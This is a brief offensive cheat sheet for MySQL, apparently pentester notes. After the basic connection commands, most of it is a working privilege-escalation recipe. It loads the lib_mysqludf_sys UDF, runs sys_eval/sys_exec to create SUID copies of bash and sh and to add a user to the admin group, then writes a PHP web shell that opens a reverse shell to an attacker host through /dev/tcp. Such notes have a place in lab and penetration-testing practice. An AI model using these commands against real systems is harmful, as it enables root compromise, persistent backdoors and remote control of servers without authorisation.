
Connect to MYSQL server:
---
#mysql #connect

```shell
mysql -h $TARGET_IP -u $USER -p
```
Show list of databases:
```sql
show databases;
```
Show list of tables in current DB:
```sql
show tables;
```
Priv esc if running as root:
#mysql #privesc #priv-esc

```sql
use mysql;
show tables;
select * from func;
CREATE FUNCTION sys_eval RETURNS INT SONAME 'lib_mysqludf_sys.so';
SELECT sys_eval("cp /bin/bash /var/tmp/bash ; chmod u+s /var/tmp/bash");
```

OR

```sql
select sys_exec('cp /bin/sh /tmp; chown root:root /tmp/sh; chmod +s /tmp/sh');
select sys_exec('usermod -a -G admin USER');
```

```shell
cd /var/tmp
./bash -p
```

```sql
select "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/$ATTACKER/4444 0>&1'\");?>" into outfile "/var/www/.../shell.php";
```
---